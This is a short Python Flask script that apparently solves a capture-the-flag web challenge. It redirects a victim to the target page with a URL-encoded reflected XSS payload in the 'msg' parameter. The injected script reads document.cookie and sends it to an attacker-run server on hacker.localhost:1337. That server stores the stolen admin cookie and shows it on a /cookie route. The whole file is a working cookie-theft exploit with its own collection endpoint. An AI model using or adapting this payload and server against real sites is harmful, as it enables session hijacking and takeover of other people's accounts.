import flask

HOST = 'hacker.localhost'
PORT = 1337
TARGET = 'http://challenge.localhost/ephemeral'
COOKIE_NAME = 'credential'

app = flask.Flask(__name__)


# this route is use for get the auth cookie of admin
# easy take the password when see the query param when the redirect is trigger to this route
@app.route('/info')
def get_admin_password():
  query = flask.request.args.get('auth')
  response = flask.make_response('Cookies has been set!')
  response.set_cookie(COOKIE_NAME, query)

  return response

# use for get cookie of admin
@app.route('/cookie')
def get_cookie():
  cookie = flask.request.cookies.get(COOKIE_NAME)
  return flask.make_response(f'The cookies of admin is: {cookie}')

@app.route('/')
def spawn():
  payload = (
    "<script>"
    "let cookies = document.cookie;"
    "let re = document.createElement('a');"
    f"re.href='http://{HOST}:{PORT}/info?' + cookies;"
    "re.text='submit';"
    "document.body.appendChild(re);"
    "re.click();"
    "</script>"
  )
  encoded_payload = payload.replace("<", "%3C").replace(">", "%3E").replace(" ", "%20").replace("'", "%27").replace("+", "%2B")
  return flask.redirect(f'{TARGET}?msg={encoded_payload}')

app.config['SERVER_NAME'] = 'hacker.localhost:1337'
app.run(HOST, PORT)